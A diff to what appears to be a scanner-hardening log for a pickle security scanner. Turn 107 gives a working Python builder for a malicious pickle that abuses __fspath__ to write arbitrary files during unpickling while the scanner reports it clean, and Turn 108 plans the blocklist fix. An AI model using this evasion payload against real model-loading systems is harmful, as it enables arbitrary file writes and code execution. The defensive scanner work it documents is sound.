@@ -5649,3 +5649,141 @@ Blocking plan:
 
 Performance note: eight literals in the existing magic-method matcher, no
 presentation-helper blocklist expansion and no protocol-dispatch flow modeling.
+
+## Turn 107 - PathLike `__fspath__` arbitrary file-write gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using PathLike protocol
+dispatch to turn a clean string-like object into an arbitrary file-write
+primitive.
+
+Candidate payload:
+
+- Create a runtime subclass with `builtins.type`.
+- Use `collections.UserString` as the base class so the instance stores an
+  attacker-controlled path string in normal object state.
+- Install `collections.UserString.encode` as `__fspath__`. It is a normal
+  descriptor that returns the stored path as bytes when `os.fspath()` is
+  invoked by file APIs.
+- Instantiate the class with the marker path.
+- Call clean `_io`/`io` file methods during unpickling:
+  `io.open(instance, "w")`, `_io.TextIOWrapper.write(file, payload)`, and
+  `_io.TextIOWrapper.close(file)`.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return text(module) + text(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_fspath_userstring_write_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "type"),
+        b"(",
+        text("PathLikeString"),
+        sg("collections", "UserString"),
+        b"\x85",
+        b"}",
+        text("__fspath__"),
+        sg("collections", "UserString.encode"),
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        text(str(marker)),
+        b"\x85R\x940",
+        sg("io", "open"),
+        b"h\x01",
+        text("w"),
+        b"\x86R\x940",
+        sg("_io", "TextIOWrapper.write"),
+        b"h\x02",
+        text("owned-by-fspath"),
+        b"\x86R0",
+        sg("_io", "TextIOWrapper.close"),
+        b"h\x02\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Control scanner result: `len=163`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- RCE scanner result: `len=261`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- Coverage for the RCE payload: `bytes_scanned=261`, `bytes_total=261`,
+  `opcode_count=50`, `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `collections.UserString`,
+  `collections.UserString.encode`, `io.open`,
+  `_io.TextIOWrapper.write`, and `_io.TextIOWrapper.close`, all with
+  `is_dangerous=False`
+- Control proof: the same pickle without the `io.open`/write/close sequence
+  returns a `PathLikeString` instance and does not create the marker
+- Unpickle result: the full payload returns `None`, creates
+  `/tmp/ma_fspath_userstring_write_marker` with mode `0o644`, and writes
+  `owned-by-fspath`
+
+RCE mechanism:
+
+- `type("PathLikeString", (UserString,), {"__fspath__": UserString.encode})`
+  creates a string-like object whose filesystem representation is the
+  attacker-controlled path stored in `UserString.data`.
+- `io.open(instance, "w")` calls `os.fspath(instance)` internally.
+- Because `__fspath__` points at `UserString.encode`, the PathLike coercion
+  returns the attacker-controlled marker path as bytes.
+- `_io.TextIOWrapper.write(file, payload)` then writes attacker-controlled
+  content to that path, and `_io.TextIOWrapper.close(file)` flushes and closes
+  it during unpickling.
+- In a model-loading process, the same primitive can write arbitrary files such
+  as startup hooks, config files, or package metadata in locations writable by
+  the loader.
+
+Why the scanner missed it:
+
+- PathLike protocol hook `__fspath__` is absent from the suspicious
+  magic-method string list.
+- `collections.UserString.encode` is absent from `DANGEROUS_GLOBALS` and is
+  not a suspicious string seed.
+- `io.open`, `_io.TextIOWrapper.write`, and `_io.TextIOWrapper.close` are
+  absent from `DANGEROUS_GLOBALS`; `_io` is not a wildcard-dangerous module.
+- The active file path is not visible as an `open` literal target. It is
+  recovered only when CPython asks the synthetic object for its filesystem
+  representation.
+
+Performance note: the focused next block should add `__fspath__` to the
+existing suspicious magic-method matcher. That is one literal comparison and
+avoids broad blocking of `collections.UserString.encode`, `io.open`, or `_io`
+file methods.
+
+## Turn 108 - Block PathLike `__fspath__` seeds
+
+Blocking plan:
+
+- Add `__fspath__` to the existing suspicious magic-method string list.
+  PathLike coercion can route attacker-controlled synthetic objects into file
+  APIs without exposing the final filesystem path as a direct `open` literal.
+- Leave `collections.UserString.encode`, `io.open`,
+  `_io.TextIOWrapper.write`, and `_io.TextIOWrapper.close` allowed for this
+  focused block. The static signal is the attacker-controlled PathLike protocol
+  slot name, not ordinary file-object method usage.
+- Add a CPython oracle regression for the Turn 107 payload. The regression
+  verifies the construction-only control is suspicious and side-effect free,
+  then verifies the active write payload is suspicious and still writes
+  attacker-controlled content to the marker during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: one literal in the existing magic-method matcher, no file
+API blocklist expansion and no PathLike data-flow modeling.
